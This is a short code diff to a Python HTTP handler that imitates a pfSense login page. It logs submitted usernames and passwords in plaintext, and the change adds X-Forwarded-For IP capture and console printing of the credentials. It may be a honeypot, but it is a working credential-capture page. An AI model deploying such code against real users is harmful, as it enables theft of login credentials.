@@ -43,8 +43,10 @@ class pfSenseHandler(BaseHTTPRequestHandler):
         with open('./logs/log.txt', 'a') as log_file:
             username = parsed_data.get('username', [''])[0]
             password = parsed_data.get('password', [''])[0]
-            ip = self.client_address[0]
-            log_file.write(f"Time: {datetime.datetime.now()}, Username: {username}, Password: {password}, IP: {ip}\n")
+            x_forwarded_for = self.headers.get('X-Forwarded-For')
+            client_ip = x_forwarded_for.split(',')[0] if x_forwarded_for else self.client_address[0]
+            log_file.write(f"Time: {datetime.datetime.now()}, Username: {username}, Password: {password}, IP: {client_ip}\n")
+        print(f"Time: {datetime.datetime.now()}, Username: {username}, Password: {password}, IP: {client_ip}\n")
         
         # Send a response
         self.send_response(302)
